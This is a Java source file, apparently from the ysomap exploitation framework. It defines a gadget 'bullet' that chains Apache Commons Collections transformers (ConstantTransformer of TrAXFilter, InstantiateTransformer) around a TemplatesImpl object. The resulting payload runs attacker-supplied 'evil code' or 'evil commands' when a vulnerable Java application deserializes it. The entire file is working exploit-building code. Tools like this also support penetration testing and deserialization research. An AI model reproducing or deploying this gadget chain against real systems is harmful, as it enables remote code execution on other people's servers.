package ysomap.gadget.bullet.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.jdk.TemplatesImplBullet;
import ysomap.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationTargetException;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithTemplatesImplBullet extends TransformerBullet {

    public ObjectGadget tplBullet;
    public Class instantiateTransformer;

    @Require(name = "args" ,detail = "evil code (start with 'code:') or evil commands")
    public String args;

    @Override
    public void initClazz() throws ClassNotFoundException {
        super.initClazz();
        if(version.equals("3")){
            instantiateTransformer = Class.forName("org.apache.commons.collections.functors.InstantiateTransformer");
        }else{
            instantiateTransformer = Class.forName("org.apache.commons.collections4.functors.InstantiateTransformer");
        }
    }

    @Override
    public Object getObject() throws Exception {
        initClazz();
        tplBullet = new TemplatesImplBullet();
        tplBullet.set("body", args);
        Object obj = tplBullet.getObject();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(TrAXFilter.class));
        transformers.add(createInstantiateTransformer(new Class[] { Templates.class },
                                                        new Object[] { obj } ));
        return createTransformerArray(transformers);
    }

    public Object createInstantiateTransformer(Object... args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        return Reflections.newInstance(instantiateTransformer.getName(),
                new Class<?>[]{Class[].class,Object[].class},
                args
                );
    }

}
